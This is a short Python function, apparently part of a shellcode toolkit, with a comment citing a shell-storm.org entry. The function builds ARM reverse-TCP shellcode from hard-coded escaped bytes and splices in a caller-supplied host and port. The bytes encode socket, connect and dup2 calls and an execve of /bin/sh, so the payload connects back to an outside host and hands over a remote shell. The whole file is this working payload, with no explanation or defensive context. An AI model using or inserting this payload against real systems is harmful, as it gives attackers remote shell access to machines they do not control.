#http://shell-storm.org/shellcode/files/shellcode-821.php



def reverse_tcp( HOST,PORT):
    shellcode =  r"\x01\x10\x8F\xE2"
    shellcode += r"\x11\xFF\x2F\xE1"
    shellcode += r"\x02\x20\x01\x21"
    shellcode += r"\x92\x1a\x0f\x02"
    shellcode += r"\x19\x37\x01\xdf"
    shellcode += r"\x06\x1c\x08\xa1"
    shellcode += r"\x10\x22\x02\x37"
    shellcode += r"\x01\xdf\x3f\x27"
    shellcode += r"\x02\x21"
    shellcode += r"\x30\x1c\x01\xdf"
    shellcode += r"\x01\x39\xfb\xd5"
    shellcode += r"\x05\xa0\x92\x1a"
    shellcode += r"\x05\xb4\x69\x46"
    shellcode += r"\x0b\x27\x01\xdf"
    shellcode += r"\xc0\x46"
    shellcode += r"\x02\x00"
    shellcode += PORT
    shellcode += r"\x13\x37"
    shellcode += HOST
    shellcode += r"\x2f\x62\x69\x6e\x2f\x73\x68"
    return shellcode